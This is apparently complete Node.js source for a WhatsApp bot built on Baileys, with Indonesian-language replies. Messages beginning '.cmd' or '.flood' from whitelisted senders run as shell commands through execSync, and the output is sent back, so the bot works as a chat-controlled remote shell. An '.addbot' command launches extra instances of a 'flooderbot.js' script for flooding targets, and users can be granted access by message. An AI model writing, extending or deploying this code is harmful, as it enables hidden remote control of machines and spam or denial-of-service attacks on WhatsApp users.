const { default: makeWASocket, useSingleFileAuthState, fetchLatestBaileysVersion, makeInMemoryStore } = require('@whiskeysockets/baileys');
const fs = require('fs-extra');
const p = require('child_process');
const path = require('path');

const ADMIN = ["628xxxxxx"];
const USERS_FILE = './allowed_users.json';
let allowed = fs.existsSync(USERS_FILE) ? new Set(fs.readJsonSync(USERS_FILE)) : new Set();

const { state, saveState } = useSingleFileAuthState('./auth_info.json');
const store = makeInMemoryStore({});

async function startBot() {
  const { version } = await fetchLatestBaileysVersion();
  const sock = makeWASocket({
    version,
    printQRInTerminal: true,
    auth: state,
    logger: { level: 'silent' },
    browser: ['KeceePyrite', 'Bot', '1.0.0'],
  });

  store.bind(sock.ev);
  sock.ev.on('creds.update', saveState);

  sock.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.fromMe) return;

    const sender = msg.key.remoteJid;
    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
    const isAdmin = ADMIN.includes(sender.split("@")[0]) || allowed.has(sender);

    if (!text.startsWith(".")) return;
    const reply = async (m) => await sock.sendMessage(sender, { text: m });

    const sendChunks = async (output) => {
      const chunks = output.match(/.{1,4000}/gs) || ['(no output)'];
      for (const chunk of chunks) {
        await reply(chunk);
      }
    };

    if (text === ".help") {
      return reply(`╭────[ WA BOT KECEE HELP ]
│ .cmd <command>
│ .flood <args>
│ .adduser <jid>
│ .deluser <jid>
│ .addbot <jid>
╰────────────────────────`);
    }

    if (!isAdmin) return reply("Access denied.");

    if (text.startsWith(".cmd ")) {
      try {
        const out = p.execSync(text.replace(".cmd ", ""), { encoding: 'utf8' });
        await sendChunks(out);
      } catch (e) {
        await reply("ERR: " + e.message);
      }
    } else if (text.startsWith(".flood ")) {
      try {
        const out = p.execSync(text.replace(".flood ", ""), { encoding: 'utf8' });
        await sendChunks(out);
      } catch (e) {
        await reply("ERR: " + e.message);
      }
    } else if (text.startsWith(".adduser ")) {
      const jid = text.split(" ")[1];
      allowed.add(jid);
      fs.writeJsonSync(USERS_FILE, [...allowed]);
      await reply(`User ${jid} added.`);
    } else if (text.startsWith(".deluser ")) {
      const jid = text.split(" ")[1];
      allowed.delete(jid);
      fs.writeJsonSync(USERS_FILE, [...allowed]);
      await reply(`User ${jid} removed.`);
    } else if (text.startsWith(".addbot ")) {
      const jid = text.split(" ")[1];
      const file = "flooderbot.js";
      const auth = `auth_${jid}.json`;
      if (!fs.existsSync(file)) return reply("Bot file tidak ditemukan.");
      if (!fs.existsSync(auth)) fs.writeFileSync(auth, "{}");
      const bot = p.spawn("node", [file], {
        env: { ...process.env, AUTH_FILE: auth },
        stdio: 'inherit'
      });
      await reply(`Bot baru (${jid}) dijalankan! (PID: ${bot.pid})`);
    } else {
      await reply("Unknown command. Ketik .help");
    }
  });
}

startBot();
